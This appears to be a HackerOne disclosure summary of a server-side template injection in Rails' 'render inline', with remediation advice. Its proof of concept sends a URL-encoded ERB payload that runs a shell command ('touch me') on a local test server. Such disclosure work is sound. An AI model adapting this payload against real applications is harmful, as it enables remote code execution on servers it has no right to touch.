# Title: Server-side Template Injection in Rails Action View

- **Platform**: HackerOne
- **Program**: Ruby on Rails
- **Severity**: Medium
- **Date**: July 25, 2020
- **Researcher**: ooooooo_q
- **Bounty**: N/A

## Summary
A server-side template injection vulnerability was found in Ruby on Rails' Action View `render inline` method. When `render inline: params[:content]` receives user input directly, it can be executed as ERB code, leading to template injection and potential RCE.

## Technical Details
The `render inline` method in Rails renders ERB templates. If user-controlled input is passed directly to this method, the content is evaluated as an ERB template. The researcher demonstrated this by cloning the Rails repository and running the test server, then sending a request with ERB payload in the content parameter.

## Steps to Reproduce
1. Clone Rails repository and run the ActionView test server
2. Send a request with ERB payload:
   `http://localhost:4567/echo?content_type=test&content=%3C%25%20%60touch%20me%60%20%25%3E`
3. The payload `<% `touch me` %>` is executed server-side
4. Verify file creation with `ls me`

## Proof of Concept
```
Request:
GET /echo?content_type=test&content=%3C%25%20%60touch%20me%60%20%25%3E

Decoded payload: <% `touch me` %>

Result:
$ ls me
me
```

## Impact
Remote code execution via template injection. An attacker could execute arbitrary system commands on the server. While demonstrated on a test server, production applications using `render inline` with user input are vulnerable.

## Remediation
Avoid using `render inline` with unsanitized user input. Use `render plain` or `render html` instead. If inline rendering is necessary, ensure input is properly sanitized and escaped.

## References
- https://hackerone.com/reports/942103
- https://guides.rubyonrails.org/layouts_and_rendering.html
